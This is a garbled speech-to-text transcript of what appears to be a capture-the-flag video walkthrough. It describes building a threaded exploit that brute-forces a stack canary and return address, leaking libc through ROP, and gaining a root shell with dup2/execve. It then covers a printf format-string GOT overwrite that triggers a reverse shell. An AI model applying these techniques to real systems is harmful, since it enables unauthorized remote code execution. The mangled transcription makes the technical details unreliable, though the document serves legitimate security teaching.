because this is going to be painful because of brute forcing a giant 64 bit registry like three times because after we Britt forced the canary we have to get to our IP and in order to do that we have to brute force our BP because it goes from your staff to our BP to our IP so brute force three addresses it's going to take a little while if we don't thread it so that's why I said it's going to be painful so let's just quit out of this rerun gdb and we'll just do run with no breakpoints and let's do file open folder support and we'll call this one also exploit pi once it loads file a new file ctrl s to save exploit PI so let's go and brute force this the functions we probably want for starters from pound import star then we probably want to do from concurrent import futures that is going to be for threading and if you want to see a video on some threading go check out I forget exactly what one it was if you go to EPS a Crocs and search for our sync if we just do let's see hips a Crocs or sync Zetas this is the video the first one we do some type of threading and this probably isn't good code to use consistently because I am NOT a great coder doing base64 in case we need this I'm guessing we will from time import sleep is always good and should be good so our context is going to be OS is equal to when X and our architecture is equal to amd64 then we want our host is equal to localhost our port is equal to leet and then I'm going to create a class called brute force err death and net self whoops Dolf of a net itself like that and let's do previous and result right now so the very first thing we need is a check bite feature so def check bite self and payload and let's see R is equal to remote this is going to connect and then check it so host report like that dot receive line set a timeout for equals to 1 and this is going to be let's see and see localhost fleet we're just getting past this and then the next is r dot send payload and then we can try response is equal to r dot receive line will give this one one second as well I guess and then we don't want any carriage returns and say if done is equal to response and it's probably going to be a bite because it's Python 3 alright dot close and return true and then accept pass and we'll try all right close accept oops pass return false so all check bite is going to be doing is checking if bite causes program to return done else stat canary probably killed us let's put that comment one more deep I guess that looks fine okay so the next thing we need to do is probably a call to get dress and get a dress is going to call check bite so self and previous and the reason why I'm including previous is because we're going to call this multiple times this brute force is going to be called first with previous equal to nothing and that's going to allow us to brute force the stack canary and then it's gonna get called again with the stack canary as previous to allow us to brute force and get our BP and then it's going to be called yet again with both the stack canary and our BP to let us get what our IP is so that's why we have previous is just so we can call it multiple times self dot result is equal to nothing self dot content is equal to nothing and content is going to be where we store the register or data so while the length of self content is not equal to eight because this piece of code is going to be running consistently until we have the full register so run until we have the full I guess address okay so junk is equal to 56 oh whoops four do a times 56 plus the previous and remember what saying previous is going to be things like the previous times we ran this it'll make sense when we get there and then probably need another variable up here and pool is equal to false and I don't have a good way to ever kill a throw thread pool in Python I'm sure it's easy I just don't know how so this is kind of how I do it we're just gonna do if not self and pool and indent all this that one two so all this is doing is saying hey if I'm not told to stop then do all this stuff but if I am told to stop then just return and that's it gonna let all these threads come to an end completely if we're doing something like async I oh I think in Python we could probably stop it gracefully but like I said this is not good code it's would take a lot to do good code and I'll explain it once we get to this thread pool and start writing it but right now we're just coding everything around it so get address we have the junk 56 previous then we probably need to set self dot and pool is equal to false and this is where we're actually getting into threading so ex4 exit executors is equal to futures duck thread pool executor and we'll say max workers is equal to 50 and then for bite and range 0 X 0 0 2 0 X 100 that's going to brute force just 0 to FF payload is equal to junk plus self dot content plus the character of bite and then thank F dot R is equal to bite and F dot had done callback self dot done so what this is going to do is start creating the job and tell this thread when it finishes call the function done so let's do def done and this is going to be self and then F and for the function if F n result so this is saying if the thread returned true then we will do log dot debug and say bite found FN dot org and I did the wrong bracket okay self dot content plus equals character half an hug and self got and pool is equal to trill so let's see so deaf done fight was found a pen to result content I guess I could do better at naming variables and tell all threads to stop or tell all jobs the work is done sure so get a dress that is done and say while true is another bad piece of code if self dot and pool is equal to true then we'll break out of this and if px dot let's see this is why I like visual studio and not doing it in them so we can do work Q dot empty and length of the threads is equal to 0 then print be able to get byte loop through everything and I guess we can do is it log dot era with bone tools and will break here and this will just be sleep one and then let's see return self dot content okay so this is going to route for us the address so let's kind of go in vim and explain what we just wrote so what we have is payload is equal to 56 and this will be a times 56 and then payload plus equals this is going to be the canary value and then payload plus equals this will be our vp value and then payload plus equals RI p value so we need to know the canary value so code continues we need to know the VP value so we know how to get to our IP because our IP is going to follow this and we need to know our IP actually to leak the base address because we'll be able to look at our IP and subtract map from our IP to equal binary difference I can spell which is also equal to rebase saying or elf and once we rebase our elf then we can leak g OT addresses for a global offset tables so that's essentially what we're doing hopefully that makes sense let's go back into visual studio and we can now say root for us is equal to root for surtout to find our class and say canary is equal to B F dot get address and we call it with nothing because we don't have anything it's automatically gonna put the payload 456 bytes for us and then if all goes well we'll do log success and say canary is the hex of unpacked 64 Canary 2 3 like that and I guess we can run it and see what I screwed up right off the bat one of the very first things I typed from base 64 import I probably said import and I just didn't type it def check byte we forgot a colon line 28 this is why I like doing in Visual Studio this try we need right there let's see f is not defined so let's see this is going to be no we never actually created the task so we do F is equal to BX dot submit self dot check fight and the payload so all this is doing is calling this function and the payload we defined to be right now just 56 a's plus the previous and we're also adding content which is a current register state so the very first time it's gonna be nothing the second yeah the second time it's going to be the first part of the canary the third times can be the first and second bite of the canary and so on we can put on this and oh man that is noisy and I bet if we look at this neck cat there is definitely a bunch of stack smashing messages we can add a few times and we don't see anything so maybe it stopped and it didn't work I'm not exactly sure so let's kill that real quick undefined variable use 64 that is a parent tools thing I think it's my visual studio being wrong let's see here I think we can set log level is equal to air and that may suppress a lot of these messages and then where is done I don't have this log debug thing is going to work let's just do print and run this again and air is Okoye callback you only was this print statement I think it was setting that log level it's probably underscore where is it level nope not that we can comment out that oh we did comment that print so the only other thing I added was that log level okay so let's do turn tools remote see what do we have remote resolving them it functions maybe this types are host it's gonna be a log level let's search level log underscore level is equal to err thought that's why I had log underscore level era I wonder if they'd have contacts that log level just drawn it still getting a bunch let's just try level run ah I think that's better we do have a bunch of things running I don't see anything in this output from parent import star we go here it is saying stack smashing detected let's see let's try running this let's quit out get everything to a clean state and [Music] we'll run it from here so I can see everything simultaneously and the very first thing should print out pretty quickly but I think we actually removed the print because they're a first part of the canary should be 0 0 so that should be super easy to find oh there we go it got it so don't need this it may just take a minute oh we can leave that comment today so that got canary we can say let's just do canary redo this and this one will be her BP and if we wanted to we could even validate this canary so if we just ctrl C up here do check SEC here you can see the canary of a program matches this so our BP is going to be the next one so this will just do this and then canary and this will be our BP and then this last one will be our IP and this can be canary plus r BP I think these are strings right now that's why I'm doing the unpacked 64 this will be our IP so our IP and rbp continue run this and we'll give it probably 30 to 45 seconds and guess while we run it we can go and you know have ourselves and do the next piece of code so let's do Stage one week the addresses this will be stage two three base our binaries and that was fast got them all so if we go VM map and look for the very first one let's see maybe actually be the second one fights on three let's do print this - this five four seven four one three seven eight something is off here continue no that's right if we do X 5 4 7 4 we get 1 5 6 2 so I just hate sometimes when my minds thinking X and it shows me an integer but this is the start of the program we are 1562 X into it so what does have to remember this number and this is going to be the same and you should always do this when within gdb because gdb is essentially going to disable ASLR for you when you start it in gdb but if you attach to it or just start it without gdb a lot of this is going to be more difficult to do so let's say difference is equal to this will call this rebase I don't know what to call this variable so we just won't call it anything and we'll say Base address is equal to use 64 or IP - that address and 0 x1 5 6 - pulled from VM map so this is going to tell us exactly where we are in the binary the next thing we'll need to do is load our elf so elf is equal to elf dot slash contact and check sec is equal to false to get rid of the noise of it doing the check sec every time and elf dot address is equal to base address and we can do Rob table so Rob is equal to drop elf and this is gonna be the pound tools way to create a Rob chain if you watch the patents video we did it manually and if I have time I'll do it manually after this but I wanted to show kind of both ways and I show both ways in the bitter man video which is a good I guess maybe introduction to this stuff that's in a more digestible format since I prepared a lot more to do that so started we built a Rob table so let's see we can begin stage 3 which is going to be leaked the Lib C address and we'll do that with a write and we want the file descriptor which I think is going to be 4 if I go here control-c process info or process status right now it's at file descriptor three when it creates the fork it'll go up one to be file descriptor for so right to file descriptor for which is going to be the future socket and then we want to write the address elf dot right and that's going to leak where it is and Lipsy and the length is just eight bytes so this prevents us from having to do wrapper and do all this manually it's just magic so in order to perform this syscall we just do Rob dot write 0 x 4 elf dot write 0 X 8 it's super easy barely any inconvenience so R is equal to remote host port level is equal to error and then we want to do our receive line timeout is equal to 1 and then we create our chain with just chain is equal to R op dot chain and then probably chain is equal to chain decode and this is just something I know from doing pound tools on Python 3 is this chain is going to be in binary format or a byte format so we decode it use Latin 1 because we'll get UTF errors if we don't and now we just do our dot send the prefix plus the chain and I don't think we defined prefix so we should do that have it up here prefix we don't so pretty fix is going to be the junk canary and our IP so let's go what are we're going to do this may be rebase a binary is a good spot to do it so work after leak only addresses so prefix is equal to F junk canary or BP so now we can get there we write or a chain there and we can say write underscore Lib C is equal to u 64 or receive the first eight bytes which is a memory address so log dot success leaked right at web C and hex right Lib C we can also like the first to run say I guess before this chain we can do it long dot success oh we can do log dot info and put rope chain right and do rope dump like that and we probably should do log infos throughout the code Stage three leaking Lib C address we don't have to do one for rebasing binaries I guess it's fine so we can continue run the exploit and I think this time I'm actually going to just copy the values and then we can just paste them in every time because it's taking like 45 seconds per run to get all these addresses so we don't have to wait since everything's gonna be the same until we restart this process so let's start that let's see stage 0 use previous values canary is equal to P 64 decode latin-1 and this will be our BP or IP and junk was not defined so that's why we're doing this so we don't have to wait okay so only do copy all of this actually as long as I don't call this we want the way about it and just comment this out whoops k you on comments so let's do KC there to comment I'll oh this ctrl K see to comment the whole block and we don't want this prefix commented and junk is not defined there so junk is equal to a times 56 maybe I defined it somewhere else so now when we run this should be pretty instant and I forgot to do something here we forgot to put it in curly braces boom and we probably have Lib C's address right there but you can see let's do backslash n the rap chain and we actually don't need this first four or the first 16 bytes of this payload because a return address is automated I after the fourth call is actually going to be set at 0 x4 so we don't have to manually do this one and it would be more stable if we didn't because if someone else is on this server it leaves a connection open then or file descriptor could be 5 so yeah we may want to later improve with stability by changing that we'll do that after we at the very first shell so what I'm gonna do is make sure my Lib C address is correct so ctrl C copy this address and look at it and what do you know we are in Lib sees right so that address was leaked successfully so the next piece is stage-four and this is the cool stay of getting code execution so log info begin code execution call it stage 4 and this will start with a or actually before we do that we probably have to load Lib C and rebase it so loading Lib C Lib C and rebasing so now that we know where the right is we can load Lib C just like we did up here and get it working so let's do e Lib C I don't know if I like that naming convention but ok elf and we probably should copy it here so locate Lib C D so 6 and we want the 64-bit so Lib C dot s o dot six dot will call it Cali okay so Lib C dot s o dot six dot Kali alright we're do health underscore Lib C elf underscore Lib C dot address is equal to write underscore Lib C - the health web see symbols right so this is just gonna set our address in Lib C so we're doing all the rebasing automatically and Rob Lib C is equal to Rob health Lib C and because we did the rebasing this way all the route calls are going to be in the correct locations so the last piece we need is been sh s address so bin s H is equal to next health web seed search and then slash bin slash sh an all bite dot encode you have no idea how long it took me to troubleshoot parent tools three I've trying this Lib C dot search function and the issue was it needs to be a bite so the dot encode that was a pain to troubleshoot so now we should have everything we could print out the address if we wanted to and verify but I mean I'm confident it works so Stage five do the whole say get code execution RCE time so what we're going to have to do is two different dupe to calls so we have to do doop two four and then zero four standard out dupe - whoops for one so this is going to duplicate the file descriptor socket into zero and one for a standard and standard L which is letting us actually interact with what we're going to execute and then after that we want to do probably exact ve and then bin SH and if you looked at the sis call you do two nulls afterwards I believe so let's create this rap chain which will be super easy so drop underscore Lib C dot doop to 0 X 4 0 X 0 do the same exact thing except 0 X 1 and then we do drop Lib C exec ve been SH 0 X 0 0 X 0 I mean it pretty much documents itself with how you do these calls so we can do log dot success and then say Rob chain is equal to prop Lib C dump so you can see what the chain looks like let's get rid of the one up here then just put this to log debug shouldn't see that it just fills up standard out and I just don't care for it cell yeah let's try sending it so let's copy our send sense and we will delete that line chain is good that is good so we can copy all this send don't need that and then r dot interactive and we can hope for the best Python 3 exploit by splitting the gadgets Heidi did not work I don't know what these bytes got printed that was weird do we have a print somewhere we send this that's the chain it's not going to happen again for science yes let's see doesn't like something we're doing prefix chain looking at this let's do rap chain backslash n I bet that's the bin Sh address that got screwed up we probably did something wrong there no that's right here so let's see so ODI we're putting two four and then RSI the second argument we're putting 2-0 and calling dupe - so dupe two four zero dupe two-for-one exec ve probably been SH zero zero so let's do x /s on that that is bin Sh so let's see or receive line let's just put a blog info sending vlog info sent and then interactive so right when we go interactive is when that happens Lib CSO Kali well if whipsey wasn't correct then ben sh wouldn't have matched up like that and I'm an idiot this is Rob lip see we were sending the old chain so we're leaking the address of right and that's what this is this is the leak address of right because I didn't update my variable name when I was copying and pasting everything so Python 3 exploit PI ID and we have paired execution locally so that is the good news the bad news is getting it on the server takes quite a bit of time so let us just save that and let's see let's uncomment and stage 1k you while holding ctrl + highlight this KC to comment that save will also have to edit our host to be oh it's actually not listening on leap it's listening on nothing so we have to go in SSH and there's two things we could do [Music] we could do a shell and do the port forwarding this way but I'm actually not because if we heard something up we're in as the sages process and we'd have to completely revert the box however if we did this from autocrat if we did it from like chisel then we don't have to worry about that so let's grab chisel and run it so locate chisel and I'm just gonna grab this one and we can do SCP - I rub r4j at 10 10 14 10 10 10 148 that : so let's see it's copying over so again if we screw up we can kill the chisel process which kills all the sockets tied to it if we're doing SSH we can't kill SSH and it may just keep zombie sockets alive which just hoses the box and we can't get back in and it's bad news bears so that's why we're doing this let's see if you don't know what chisel is my reddish or EDD is H video should help a lot we want to do reverse we're gonna have it here copy chisel in this directory server reverse ad a is already being in news I throw is 1080 by default huh chmod plus x chisel and let's see this is going to be client ten ten fourteen three no two and r.i.p i think we can do port like that are for reverse one three three eight one twenty seven zero zero one one three three seven connecting fingerprint good so now if I do neck at localhost one three three eight it goes through chisel and we get this message and that is slow so you can see like a full second there almost instantly there so we're gonna change our time outside our script as well so localhost Airport is one three three eight server and let's see 1 3 3 7 this will be local and I'm also gonna see if I can speed this guy up so Shi row I think it's John that has HTTP server running so 10 10 10 148 let's see if we can speed this up any psdf crap HTTP we have a few threads running let's just kill them and see what happens it's not behaving any better I think this box is just single threaded and that's where a lot of these issues come from see 1 2 5 6 yeah that's got a capital G this is still going slow Gil - nine one five five six one six seven six one seven five four four three one two I probably undone like Pico - nine but oh man that's that's actually behaving better and see localhost' one three three eight feels like it's better yeah that's definitely much more tolerable so what were we doing oh we got grabbed blip see let's go SSH back in and locate flip CSO dot six it's probably this guy here so let's go into support scpi rope Shawn at ten ten ten 148 oh I just don't know it's Cali is what I have right yeah so Lipsey so6 and we'll say dot target and we can go back here and say Lib C is equal to Lib C es au dot six target and would we reference it right here so elf wipsy okay and 50 workers is probably going to be a little too many we can probably set it to I'm just going to do five and we're just going to let this run and it takes quite a while start from this one SH si John at 10:10 and 148 watch - an one or do ya one here and psdf grip on contact and we'll pipe that - WC - shell this is just gonna show us how many threads we have going on simultaneously so Python 3 let's make sure exploit is set correctly 1 3 3 8 web sees the right one so here goes nothing Python 3 exploit PI run it and we can see it goes up a little bit we could try more threads to speed this up but it's definitely not something you want to give way too many threads on so just gonna speed up the video and we'll give it probably 5 to 10 minutes so I'm not sure this is actually working so I'm gonna kill this as much as I hate to waste the time it was running and I want to definitely put this comment back and we can do right here log info grabbing canary this will be grabbing our BP and this will be our IP so let's now change the workers let's just do two it should definitely be safe see guess we can run this again found the first byte as zero so that is definitely good for some reason the logger didn't work I guess maybe we're not at informational level not sure but we got the second one so here we can just speed up the video hopefully and we may get lucky so this takes a while and it's now loading we sent the payload and here's the moment of truth does ID work it does so first try we got this if we do hostname we are on route and we can do WCC root X to prove yes we can in fact read this file so hope you guys enjoyed that whole path let's now get away from doing this remotely and go back to doing it locally our in our box because the threading is so much nicer when we have multiple cores and everything so this is where I wanted to be I think and let's see we can comment Stage one out again with KC and do K you here to uncomment this and let's make sure exploit works real quick I just wait it's not gonna work because we have to change this and we also change Lib C to B dot Callie now if we Python three exploit PI Oh No save there not comment out the right thing Stage one I must have oh I didn't comment everything okay see there we go run this ID does work so what we want to do is stop at the leak real quick and we're going to show what happens after that fork and pray we don't ruin the binary not to read brute-force this but Luke Lee doesn't really take too long so let's set follow exact mode to be child what set follow fourth mode to be child I don't know what I was thinking there and let's just break on fork continue and let's see is that the very first one we're doing we have stage zero not making a call yes that is the first one so if we just run our exploit script I guess it timed out which is fine and get out of this for call so oh crap I just hit see let's see if we can go up real quick and see what it said so remember get UID this is the very first part of hand requests right yeah so this is where we had been so if we keep going up a little bit and look at the registers there see it looks like it's not set yet well that's a bummer let's see psdf grab contact hopefully gonna attach here where are we just set follow fourth mode shy old brake on do we still have the brake on fork I think we do run the exploit let's get out of this so step Nazi s and this is where we get into the first function is it set here it's not yet I'm pretty sure by the time I guess this one sets it in this function so the get you ID we can do next to step over it this is a call to printf so we are right here so we can do next to step over this then we get a call to string length which is this one so we can next to step over that got right step over is this one and now we are going into this function which may be handle message I think that's what we called it before actually but okay so we get in here and let's do s to step inside now in handle message and if we look at our di the very first argument it is already set at 0 X 4 which is the file descriptor so we attached again set follow fork mode parent info be delete one continue so what we can do is purposely break our code so we want to do Rob right 0 x8 so now we won't be able to leak Lib see hopefully stage 3 leaking Lib see this was for at leaks 8 it does not so what we want to do is change this back to success and look at the wrap chain we build we want to remove 8 bytes and 16 bytes so 8 8 to get rid of this whole call and we can do that with Python and this is probably the ugliest code so print abcdefg oh let's do x equals so they just do X 2 princess if we do X 2 colon prints everything after 2 so what we want to do is 16 to take out the first tool so chain 16 : remove the pop RDI 0 x8 thing pop RDI return I guess we can say so now if we run our exploit PI we still leak Lib see despite whatever or a file descriptor is set at because again it's going to ignore that call so even though we're writing this whole rap chain these first two things are removed and probably sometime down the line we'll I'll try to see if I can add like a way to just do no here and have it skipped the call but right now I don't think pen tools supports that but it shouldn't be too hard to add something like that to skip registers and could be handy so this next one is going to be a little bit trickier so let's K you to uncomment everything and where's chain so we don't have to send this ever so we can just uncomment or comment that and we are already printing this rap chain we can remove that one and examine this chain so we actually got to remove stuff out of the middle of this so we got to remove these two so there's gonna be 16 to 32 and then the next one will have to remove will be this one so this is not gonna be code I am proud of but hey it's going to work so it's not stupid code if it works again I'm just setting these registers to something that should not work so we can save that and then the chain will do chain 1 is equal to chain 16 is going to skip the grab everything up to 16 and chain 2 is equal to chain this one will be 32 and 32 years on this side so what we just did was 16 as grabbing this and 32 is grabbing this so we're grabbing everything but these two so chain is equal to chain 1 plus chain 2 and this is remove first doop first pop RTI in doop to STD I think I'll call maybe it's STD n we just man STD L is this zero or one file descriptor STD n is 0 SD out is 1 SD air is 2 so this one is STD n and then the next one is going to be STD out so chain 1 is equal to so 8 16 screw those 40 think that and chain 2 is equal to chain 56 chain is equal to chain 1 plus chain 2 and maybe it'll work run this ID and we still get code execution despite this definitely being wrong and that's again because that register was already set and we just reused it so if we wanted to manually do all this exploit we can do that so let's just CP exploit PI to manual dot pi and we will begin doing that going over to visual studio we can probably open up manual pi close out of exploit and again I deleted too much I think and we don't need yeah these comments so that should be fine this brute force thing I guess we can get rid of it to clean up there we go and get rid of this because we won't be using it so we don't really take advantage of parent tools to get to here rebasing our binaries this is instead of doing elf dot address we can create a function so we can do def bin address addr is equal to return addr plus what is it bin underscore base we probably want to copy that to put it here and this is a so dress okay you can also do something like lambda then addr addr a tiara plus face a dress or something but I just find those functions hard to read so just because you can do it on one line doesn't mean you should always do it on one line so that's that we can get rid of this and we're not loading the elf because we want to do this the hard way and we can get rid of the robbed call so what we have to do is now everything manually so rupp dot right and i can't do that we have to pull out all the pop addresses so proper search pop question mark question mark and file is contact and we want I think it's RTI RSI and RDX is the register calls so let's see pop RDI is equal to zero X like that then we want pop RSI r15 is equal to this we don't need all those zeros kind of line these comments up and the final one in case we want it is RDX and we will want it so pop RDX paste and line these comments up and this isn't exactly where everything is we have to do been addr on each of these to get it to the location I hope so let's see this will go up here so now we wait to get the right to dress so I think I can do this via object dump - D contact grep right right is probably at 10:50 so right we'll say this one is PLT right is equal to then a TDR 0 x 1050 I think this is right forget how to get the G ot got - I write still not exactly what I wanted read elf - s on contact grep - I write oh why is it all zeros how is pound tools getting this I guess we can try 4028 and hope for the best this is a bit harder than I expected so let's see so I had a manual here maybe not so was it a I call it PLT something okay well redo it PLT right then addr this is G ot and this was read elf - our contact grab right and then PLT right is equal to been a DDR 0x this was just object dump - D contact CD support Harvick dump - D contact oh crap I wasn't doing it a rim I was doing it over here 40:28 G ot 402 8 g OT right and this is read elf - R and this is object dump - D so hopefully there's all work so now we can build the rap chain so what we want to do is RUP + equals and this will be right and we'll do null for nothing because we don't want to overwrite that stock at address which is 4 and then after that it's going to be G ot PLT I believe do I have the chain written chain yeah so rap plus equals pop RSI ar-15 and then Rob now we can do plus 0 X 0 no this is all right 50 so we're popping this and we have to put the value for RSI and the value we want for RSI is G ot right and then we want the null value because we don't care about our 15 so rap is that then the next thing we need to do is call Quixote right right right null oh we have to do drop plus equals pop our DX plus 0 x8 for the length and again we're not doing the RDI one at all because we don't want to set it if we did want to set the file descriptor we just do pop RDI + 0 x4 so I think that is right Casey we can get rid of all this and plus R up and it's probably will have to do some like new 64 stuff and get this properly formatted so Python 3 Manuel da pie yeah so our nuts and rap is currently an integer so we do you 64 will network know if nothing says in code let's see string not bytes so this will probably be dot decode land - one and did not work so looking at this let's just take this decode out and take this Rupp piece out like that and wonder what happens if I just put the P 64 in this command a five Python file let's see can't can cut in two bytes or you'll be be and that so I wonder if we can just do in code let actually work let's see I don't think it's that this won't make much sense to it this way because I would just be putting the string on the stack so is it hex or maybe needs to be a memory address so P 64 the packet that looks right okay so now we should probably have drop is equal to R up decode latin-1 so that should convert this into a string which then we can use to concat the two things it was trying to and there we go lead to Lib C address so that is good so clean this up Lib C and I guess we could go and double check by just control of C X slash X Lib C right that looks good continue and now we'll have to pretty much do the same exact thing but rebase Lib C and then do all these calls so let's see we can do log info calculating Lib C offset and we don't load Lib C anymore and the Lib C base is going to be equal to right Lib C and then we have to get the address of this right call so go back here object dump - D Lib C Kali got - I write and let's see maybe right at we want to grab and I think this is the address underscore underscore right G Lib C so - vent and this was pulled via object dump - D Lib C okay we can pretty much copy this and move it down here to do a rebase this will be Lib C address is equal to that plus Lib C underscore base so now all we have to do is grab all the calls so let's see we do strings as an ax t are Cali is it fr see something like that [Music] strings print hex maybe hex location let's see strings X location when X well let's see strings we want all and maybe bytes no that's not it print the location of the string so a t we want it in base 16 so X and then probably I don't f and our do I don't see does that do anything is it just a TX I'm just gonna do a TX I'm probably miss remembering the command so grep been SH so there we go so been s H is equal to Lib see a TDR 0 X that and this was done by strings - 80 X on Lipsy so the next thing we need to do is find where dupe 2 is so probably object dump again - dee doop to grab or not grip Lib C Kali and let's see grab tube tool and we probably want this one so dupe 2 is here so dupe 2 is equal to Lib C a DDR 0x and we'll say this is object dump - D Lib C and then we probably want exact ve is Lib C a DDR and the same exact thing exact ve and we'll do CB 130 a big dump - D Lib C so we should have all those locations and hopefully they're right and we can begin doing our wrapping so let's do prop is equal to and the first call is going to be duped - so we're not gonna worry about RTI the first register because we're assuming the file descriptors already set so it was pop RSI our 15 plus how do we do this address and then that so this is going to be doop to will say four which is really no zero yeah it was just too so this will be P 64 0 X 0 plus P 64 0 X 0 the second piece doesn't matter that's again because we're doing the RSI 15 so this will be for STD n I believe and then R op plus equals this will be one for s CD out and then exact ve been Sh null null and this is the one we'll use the RDI value so we can do well RUP plus equals dupe - we actually have to call them and now we can do drop plus equals up hardy I plus been Sh prop plus equals I'd we did do exact ve and rap plus equals pop RSI ar-15 P 64 0 X 0 because these next two should be null and what's saying a third argument so we can do it up plus equals Rd X pop party X plus P 64 0 X 0 so let's see that should be the chain so maybe it will work maybe it won't I think it will so prefix + R up Python 3 manual PI let's see can only do strings not bytes we screwed something up how do we send Rob oh we need to rob is equal to rob decode latin-1 ID hey it works we did it completely manually so again let's see I guess we can go over the code real quick and then we move into the other binary which was the printf so starting up just learning all the variables that's easy this is again using the variables we had before which was the Canaries base address with calculating this is portal from VM map and then we just create a little function to return the relocation addresses so when we do pop RDI the very first thing is leaking the Lipsy address and we do this through right and oh this is just setting up variables it is so these will all done through wrapper we can put proper like that and then these two were done through a big dump and read elf so here's the very first Rob chain so the very first thing we do is we're going to grab the second argument which is RSI and we're going to put the global offset location for right there and then we're going to put 0 x8 which is the size of data we are writing and then with those two arguments we can just call right and again we don't want to specify the file descriptor which is for in this case because it is set from this call right here setting it to be 4 so we could manually set this file descripted before but there's a chance it may not be for because if there was like let's just show it working real quick ID it works so let's just say you're doing this server and localhost 1 3 3 7 the photo descriptor is not for right now and it works because we're not mainly popping it but wait maybe it is huh I didn't think it would be I thought each request would increment it by 1 but it doesn't look like it's happening so won't worry about explaining it but we just didn't set it because it was already set if you really wanted to you could do drop is equal to R di + 0 X 4 and then this one would be + equals and they can change this to be 0 X 4 so if you really want to do it that way you could but I hate sending things if I don't have to so this calls the right which will leak the G ot PLT address then we go to stage 2 I don't even know what stage this is right now we've all done screwed up or comments doing this next stage and this will be calculating offsets and no there we go so this is getting the eight bytes for leaked address and again we're just connecting waiting for it to say please enter enter the message and then sending it a rope chain and then recording the bytes here we do the same thing we did with that elf calculate Lib C's base by just doing write Lib C minus the leaked dress the leaked address - where it occurs in Lib C and this was grep right like that and create a small function just to do all the rebasing for us so we don't have to always say this address - whatnot strings ATX and we grep for Ben SH and this gets us this address again object dump to get dupe - object dump to get exact ve and here we are creating our chain so I'm gonna put null here because we're just using the file descriptor which is already on the stack and this argument is RSI so that's why we're putting 0 there this one is 1 and again again called dupe 2 and finally the last one so that is that so let's take a break from doing a bunch of rock chaining and get into exploiting lids see so let's exit all this this is quit exit we don't need this anymore either boom so if you're unfamiliar with printf the best resource I have found is on YouTube and if you just search like live overflow printf he's got like three videos that are great so this is the one in specific with doing the 0 X 13 I think this is the first warning in the series the 0 X 11 so probably watch both of these would be a good background if you get lost at what we're doing so we're just going to jump straight into it and CDH to be server on booth and let's copy exploit to be Manuel PI and we're not going to bother doing all this rebasing stuff manually because we literally just did that a few minutes ago so all we're interested in right now is with this FM TST our payload things doing so I'm even going to remove the command and we're just going to send payloads so the key thing in this printf is knowing that you can write to memory addresses along with leaking them so as a precursor remember we did this HTTP server and then let's see we can do payload is equal to 1 2 3 4 ace and then we can do payload plus equals was it % x and then times 60 we'll say and see what happens here Python 3 manual di and this is where we were leaking addresses and the A's are right here and this was at the 53rd spot so what we're going to do is load the address we want to leak here so this is going to be P 32 and we want to leak well we want to overwrite the G ot puts so we can look at what G ot put was is this so this is the address we are overwriting and then what we can do is say hey Lib C print I think that's four spaces and I think we have to encode this because this is going to be coming encoded and payload plus equals and we can say hey Lib C write it to this address so what this is doing is printing four characters and it's going to write them to the address at 53 and that was all the way down here this is 53 we just remember split all these so if you just did copy and then Python 3x equals this x equals x dot split split and then X dot index for A's it's 53 so that's where you got that 53 number from so let's see what happens here so we're going to do P kill - 9 HTTP server gdb dot slash HTTP server run it break on Fork run our exploit we got a jump over the first one and now we're going to set follow fork mode to be child and we want to look at it was log access as the vulnerable function where printf is I'm going to break on printf and we should follow this right in here if we do G ot puts we can see we're currently five six five five six one two six I'm gonna do end to step over this call G ot puts whoa that wasn't supposed to happen it was supposed to write four to this let's see payload plus equals this is going to be G ot puts this needs to be percent for X not dollar so that should be that put run the same thing again we can just do control our fork B space F see Ron continued the first time and now we can do be spaced are all these addresses should be the same because we're loading us up and gdb with ASL are disabled so continue got puts next got puts still didn't do what I expected it to see take a look at this let's see sent 4x that's right and sent 53 that should go in here I want to say this is correct let's see quit just run this let's see if we don't do this 53 we get that 404 so we're writing it five six five six one two six five six five six one two six 9 we shouldn't be able to connect to this anymore right ok let's do this one last time run break on Fork run jump over the first one cuz it's just game proc Maps I guess I should really hard code these addresses so we can stop doing that step cent follow for child this as log access and we want to grab this second printf please stir this continue so we hit this we got the memory address % for X % $53 n is what we're doing that's correct but Gio T's G ot puts weird I'm screwing something up I wonder this is actually at 54 let's see 5 F 0 for 8 wait doing the wrong address hey is it 5 a 0 for 8 I don't know I got that from 5 wait 1 2 1 2 1 what I have no idea where that one address came from payload equals P 32 that's the address we want it is way too late for me right now there we go well at least you know what's going to happen if you put the wrong address there so run B fort continue run this jump over the first one set to follow fourth mode a child break on the printf continue and then we can do G ot puts step over and it's 0 X C so what this did was we probably printed 8 here and then two more and one probably and that's 13 so it's probably like a backslash and somewhere that we printed or something but that's that and we'd want to get all the way to the system address and we can't just print out this and spaces so if we did Python print 0 X this we just can't print out all these numbers it's too big weird things will happen but we can break this up into two chunks and then print both of these numbers so let's get it equal to 6/5 easy RL so I'm going to print six five zero minus what is it 0x see I think +4 I'd want because we already are printing 4 and we're going to remove this 4 o 0 X so probably X - 6 0 we don't wanna do that we just want this so this should be able to print the last 4 and while we do that we're going to actually yeah we'll do this so we're going to print this plus 2 and we're going to copy these two lines put this to be plus equals and this one will be 54 this is just one aerator up and let's see two six zero seven two so let's do Python and we want this to be equal to this so we can do print zero X that - two six zero seven two three seven three eight five so we can try this first and see what happens okay so let's now run this all we need to break on Fork now we can follow mode and then break on printf continue to that G ot puts next G ot puts so now it is six five easy RL that's exactly what we want and f7 e 9 and we're at f7 e one so we went probably eight to four or maybe seven four just try eight first so V Manuel this will be zero wait 85 - what we sang eight so seven six should be it so let's just can run it break on for C and now we can continue past this set follow for it break on what we want - this is the printf statement continue G ot puts step in once G ot puts f7 e 0 f 7e one six five easy RL so I am short one so we can just go back here and seven seven I subtracted nine earlier not eight let's do this one last time run be four continue set continue next and then G ot puts and we have f7 e 1 have 7 e 1 6 5 a 0 at this so now we can continue and get out of this whoa B kill it and edit this and we can actually put a command here I'm not exactly sure what command that one's doing it's probably in port 9001 on us grep CMD on manual and we can echo - n be 64 - d that is on localhost run and Python 3 manual PI and we get the shell it's where there has base 64 invalid input but looks like it's working and that is the Lib C exploit so I hope you guys enjoy that and kind of understand how it works again all it is is this n says how many characters have been printed before and you write it into what register you want so hopefully it makes sense take care and I'll see you all next week